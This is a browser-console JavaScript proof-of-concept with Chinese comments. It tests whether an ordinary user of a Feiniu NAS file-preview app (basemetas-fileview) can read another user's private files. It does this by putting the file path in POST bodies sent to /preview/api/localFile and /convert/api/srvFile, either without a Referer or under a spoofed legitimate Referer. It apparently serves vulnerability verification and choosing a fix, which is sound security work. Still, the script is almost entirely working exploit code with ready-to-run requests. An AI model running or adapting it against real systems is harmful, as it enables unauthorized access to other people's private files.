/* ============================================================================
 * POST body 路径绕过 —— 浏览器控制台验证脚本（v2，可产出有效结论版）
 * ============================================================================
 *
 * v2 相对 v1 的修正（v1 跑出的 403/404/null 是无效证据）：
 *   ① 不再自动伪造路径 —— v1 自动拼的 /vol1/@home/<uid+1>/probe-not-mine.docx
 *      根本不存在，导致只拿得到引擎的 404，而 404 其实意味着「闸门已放行」，
 *      被误读成「没绕过」。v2 要求你填**真实存在**的私有文件。
 *   ② 新增 [0] 前置自检：先确认 PRIVATE 真的对当前用户不可读、PUBLIC 真的可读。
 *      填错文件会当场断掉，不会浪费你一次真机跑。
 *   ③ 状态码按正确矩阵判读：
 *        403            → 闸门拦下
 *        404/400/500    → **闸门已放行**（引擎报错），提示你换真实文件
 *        200            → 绕过成立（核心证据）
 *   ④ PUBLIC 留空时显式标注「跳过」，不再输出误导性的 null。
 *
 * 用法（不需要终端）：
 *   1. 用**普通用户**（非管理员）开**无痕窗口**登录飞牛，打开本应用任意页面。
 *   2. F12 → Console → 把本文件全部内容粘进去 → 回车。
 *   3. 按输出提示操作（大概率会让你填两个路径后重跑一次）。
 *
 * 怎么找这两个路径（用管理员账号在文件管理器里看）：
 *   - PRIVATE：属于**别人**的文件，形如 /vol1/@home/别人用户名/合同.docx
 *              或 /vol2/别人的uid/私密/合同.docx
 *   - PUBLIC ：属于**你自己**的文件，随便一个能打开的
 *   填**容器内可见的绝对路径**（就是 /vol 开头那条）。
 * ==========================================================================*/

(async () => {
  // ===== 填这两个（都必须是真实存在的文件）=====
  const PRIVATE = '';   // 当前普通用户**读不到**的文件（属于别人）
  const PUBLIC  = '';   // 当前普通用户**读得到**的文件（属于你自己，做对照）
  // ==========================================

  const P = '/app/basemetas-fileview';
  const base = location.origin;

  const log  = (...a) => console.log('%c[探测]', 'color:#0af;font-weight:bold', ...a);
  const ok   = (...a) => console.log('%c  ✅', 'color:#0a0', ...a);
  const bad  = (...a) => console.log('%c  ⚠️', 'color:#e00;font-weight:bold', ...a);
  const note = (...a) => console.log('%c  ·', 'color:#888', ...a);
  const hr   = () => console.log('%c' + '─'.repeat(66), 'color:#444');

  hr();
  console.log('%cPOST body 路径绕过 —— 验证 v2', 'font-weight:bold;font-size:14px');
  hr();
  log('origin =', base);

  // ── 前置：确认会话与身份 ────────────────────────────────────────────
  let who = '';
  try {
    const w = await fetch(P + '/__whoami', { credentials: 'same-origin' });
    who = (await w.text()).trim();
    log('__whoami →', who);
    if (/uid=\s*\|/.test(who) || !/uid=\d+/.test(who)) {
      bad('拿不到 uid —— 可能你不是从飞牛网关进来的，或身份头没注入。后面无法判定。');
    }
    if (/isadmin=true/i.test(who)) {
      bad('当前是**管理员**账号！管理员本来就能读所有文件，"读不到的文件"无从谈起。');
      bad('请改用**普通用户**（建议无痕窗口）重跑。');
    }
  } catch (e) {
    bad('__whoami 取不到:', e.message);
  }

  // ── 参数校验：不带真实路径就别跑，避免又产出一堆无效数字 ──────────
  if (!PRIVATE) {
    console.log('');
    bad('PRIVATE 未填 —— 中止。');
    note('v1 会自动伪造一个不存在的路径，结果只能拿到引擎的 404（那不是"没绕过"）。');
    note('请用管理员账号找一个**真实存在、属于别人**的文件，把 /vol 开头的完整路径填进 PRIVATE。');
    hr();
    return;
  }
  if (!PUBLIC) {
    log('PUBLIC 未填 —— [0-b]/[3] 对照用例将跳过（不影响主结论，但建议补上）。');
  }
  console.log('');
  log('PRIVATE =', PRIVATE);
  log('PUBLIC  =', PUBLIC || '(未填)');
  console.log('');

  const R = { preBlocked: null, prePublic: null, getBlocked: null, postBypass: null, postWithRef: null, postConvert: null };

  // ── [0-a] 自检 PRIVATE：GET 一次，必须被闸门 403 ────────────────────
  hr();
  console.log('%c[0-a] 自检：PRIVATE 是否真的读不到', 'font-weight:bold');
  try {
    const r = await fetch(`${P}/preview/view?path=${encodeURIComponent(PRIVATE)}`,
                          { credentials: 'same-origin' });
    R.preBlocked = r.status;
    log('GET /preview/view?path=<PRIVATE> →', r.status);
    if (r.status === 403) {
      ok('403 —— 确认读不到，前提成立 ✅');
    } else if (r.status === 200) {
      bad('200 —— 这个文件你**读得到**！PRIVATE 选错了（必须选读不到的），中止。');
      hr(); return;
    } else if (r.status === 302 || r.status === 401) {
      bad(r.status, '—— 登录态有问题（被网关重定向/拒绝）。先用浏览器正常打开一次应用再看。');
      hr(); return;
    } else {
      note('其它状态码', r.status, '—— 若为 404 说明路径在容器内不存在，请核对路径。');
      note('（闸门只判路径前缀+ACL，不检查存在性；404 通常来自引擎或路由。）');
    }
  } catch (e) { bad('请求异常:', e.message); }
  console.log('');

  // ── [0-b] 自检 PUBLIC：GET 一次，应当 200 ───────────────────────────
  if (PUBLIC) {
    hr();
    console.log('%c[0-b] 自检：PUBLIC 是否真的读得到', 'font-weight:bold');
    try {
      const r = await fetch(`${P}/preview/view?path=${encodeURIComponent(PUBLIC)}`,
                            { credentials: 'same-origin' });
      R.prePublic = r.status;
      log('GET /preview/view?path=<PUBLIC> →', r.status);
      if (r.status === 200) ok('200 —— 可读，对照有效 ✅');
      else bad(r.status, '—— 期望 200。这个对照文件可能填错了，[3] 的结论将不可靠。');
    } catch (e) { bad('请求异常:', e.message); }
    console.log('');
  }

  // ── [1] 对照：GET 带私有路径（与 0-a 同，保留以免与旧记录对不上）────
  hr();
  console.log('%c[1] 对照：GET 带 PRIVATE', 'font-weight:bold');
  R.getBlocked = R.preBlocked;
  log('→', R.getBlocked, R.getBlocked === 403 ? '（闸门正常）' : '（见 [0-a]）');
  console.log('');

  // ── [2] ★ 攻击：POST /localFile，body 带私有路径，**不带 Referer** ──
  hr();
  console.log('%c[2] ★ 攻击：POST /preview/api/localFile  body=<PRIVATE>  无 Referer', 'font-weight:bold');
  try {
    const r = await fetch(`${P}/preview/api/localFile`, {
      method: 'POST',
      credentials: 'same-origin',
      referrerPolicy: 'no-referrer',        // ★ 不带 Referer（等价 curl / 关 Referer）
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        srcRelativePath: PRIVATE,
        previewType: 'SERVER_FILE',
        fileName: PRIVATE.split('/').pop(),
      }),
    });
    const text = await r.text();
    R.postBypass = r.status;
    log('→ HTTP', r.status);
    note('响应前 300 字:', text.slice(0, 300));

    if (r.status === 200) {
      bad('200 —— **绕过成立**！闸门放行、引擎按 body 里的私有路径读到了文件。');
      bad('请把这一段的"响应前 300 字"完整截图 —— 这是端到端核心证据。');
    } else if (r.status === 403) {
      ok('403 —— 闸门拦下了，**未绕过**。');
      note('（若你已上过 fail-closed 收紧，这是预期结果。）');
    } else if (r.status === 404 || r.status === 400 || r.status === 500) {
      bad(r.status, '—— **闸门已放行**（阻塞点不在闸门），是引擎这层没读到文件。');
      note('404 = 文件在容器内不存在（路径写错）或格式不被支持；400 = 参数被引擎拒；500 = 引擎内部错。');
      note('★ 这个结果**不能**说明"没绕过" —— 只说明这次没读到内容。请核对 PRIVATE 路径后重跑。');
    } else {
      note('其它状态码', r.status, '—— 看上面响应内容判断。');
    }
  } catch (e) { bad('请求异常:', e.message); }
  console.log('');

  // ── [3] 对照：POST 带**合法 Referer**（掩护场景）───────────────────
  hr();
  console.log('%c[3] 对照：POST body=<PRIVATE> + Referer=<PUBLIC>（合法页掩护）', 'font-weight:bold');
  if (!PUBLIC) {
    R.postWithRef = 'SKIP';
    note('跳过（PUBLIC 未填）—— 这条用于判断"fail-closed 能不能兜住合法 Referer 掩护"。');
    note('想跑就填上 PUBLIC 再来一次。');
  } else {
    try {
      const r = await fetch(`${P}/preview/api/localFile`, {
        method: 'POST',
        credentials: 'same-origin',
        referrer: `${base}${P}/preview/view?path=${encodeURIComponent(PUBLIC)}`,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          srcRelativePath: PRIVATE,
          previewType: 'SERVER_FILE',
          fileName: PRIVATE.split('/').pop(),
        }),
      });
      const text = await r.text();
      R.postWithRef = r.status;
      log('→ HTTP', r.status);
      note('响应前 300 字:', text.slice(0, 300));
      if (r.status === 200) {
        bad('200 —— **"合法 Referer 掩护非法 body" 也成立**，比无 Referer 更严重。');
        bad('→ 修复必须上方案 B（让鉴权层读 body），fail-closed（方案 A）兜不住。');
      } else if (r.status === 403) {
        ok('403 —— 被 Referer 里的 PUBLIC 路径判定拦下了。');
        note('→ 说明方案 A（fail-closed）能兜住这一类；但要确认正常预览流程不会被误伤。');
      } else {
        note('其它状态码', r.status, '—— 放宽看响应内容。');
      }
    } catch (e) { bad('请求异常:', e.message); }
  }
  console.log('');

  // ── [4] 补充：转换接口（可写面）────────────────────────────────────
  hr();
  console.log('%c[4] 补充：POST /convert/api/srvFile（该接口是"可读+可写"）', 'font-weight:bold');
  note('本用例只会让引擎尝试转换，不下载内容。若返回 200 说明事件已入队。');
  try {
    const r = await fetch(`${P}/convert/api/srvFile`, {
      method: 'POST',
      credentials: 'same-origin',
      referrerPolicy: 'no-referrer',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        fileId: 'probe-' + Date.now(),
        filePath: PRIVATE,
        targetFormat: 'pdf',
      }),
    });
    const text = await r.text();
    R.postConvert = r.status;
    log('→ HTTP', r.status);
    note('响应前 200 字:', text.slice(0, 200));
    if (r.status === 200) {
      bad('200 —— **转换接口同样绕过闸门**，且该接口会把内容转换后写到 targetPath（可写面）。');
    } else if (r.status === 400) {
      bad('400 —— 闸门已放行，引擎在做参数校验（如"不支持此转换组合"）。');
      note('换个支持的组合（如 .docx → pdf）再试可拿到 200。');
    } else if (r.status === 403) {
      ok('403 —— 被拦。');
    } else {
      note('其它状态码', r.status, '—— 看响应内容。');
    }
  } catch (e) { bad('请求异常:', e.message); }
  console.log('');

  // ── 汇总 ───────────────────────────────────────────────────────────
  hr();
  console.log('%c========== 汇总 ==========', 'font-weight:bold');
  const ym = (v) => v === null ? '未跑' : v === 'SKIP' ? '跳过' : v;
  console.log('[0-a] PRIVATE 自检   :', ym(R.preBlocked), R.preBlocked === 403 ? '（读不到，前提成立）' : '（异常，见上）');
  console.log('[0-b] PUBLIC  自检   :', ym(R.prePublic),  R.prePublic === 200 ? '（可读，对照有效）' : '');
  console.log('[1]   GET 对照       :', ym(R.getBlocked));
  console.log('[2]   POST 无 Referer:', ym(R.postBypass),
              R.postBypass === 200 ? '← ★ 绕过成立'
            : [400,404,500].includes(R.postBypass) ? '← 闸门已放行，引擎层报错（换真实文件重测）'
            : '');
  console.log('[3]   POST 合法Ref   :', ym(R.postWithRef),
              R.postWithRef === 200 ? '← 掩护也成立（需方案 B）'
            : R.postWithRef === 403 ? '← 合法 Referer 兜住了（方案 A 可用）' : '');
  console.log('[4]   POST /srvFile  :', ym(R.postConvert), R.postConvert === 200 ? '← 转换接口也绕过（可写面）' : '');
  console.log('');
  console.log('%c判读口诀：403=闸门拦；404/400/500=闸门已放行（引擎报错）；200=绕过成立。', 'font-weight:bold');
  hr();
  console.log('把以上全部输出（含 [2]/[3]/[4] 的响应前若干字）发给作者。');
})();
